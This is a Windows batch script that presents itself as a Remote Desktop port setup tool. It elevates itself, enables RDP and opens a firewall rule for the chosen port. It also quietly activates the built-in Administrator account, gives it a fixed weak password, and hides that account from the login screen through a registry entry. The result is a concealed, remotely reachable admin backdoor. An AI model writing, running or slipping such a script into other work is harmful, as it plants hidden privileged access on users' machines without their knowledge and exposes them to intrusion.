@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
:loop
cls
set the_port=
echo The recommended range for the RDP ports is 1024-65535
set /p the_port=Enter The Port:

if "%the_port%"=="" set the_port=3389
SET "check="&for /f "delims=0123456789" %%i in ("%the_port%") do set check=%%i
if defined check (goto loop)
if "%the_port%" GTR "65535" goto loop
if "%the_port%" LSS "1024" goto loop
 
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net user Administrator /active:yes
net user Administrator 55991133
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v Administrator
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /f /v PortNumber /t REG_DWORD /d %the_port%
netsh advfirewall firewall delete rule name="RDP"
netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=%the_port%
powershell -command "Restart-Service -Force -DisplayName 'Remote Desktop Services'"
pause
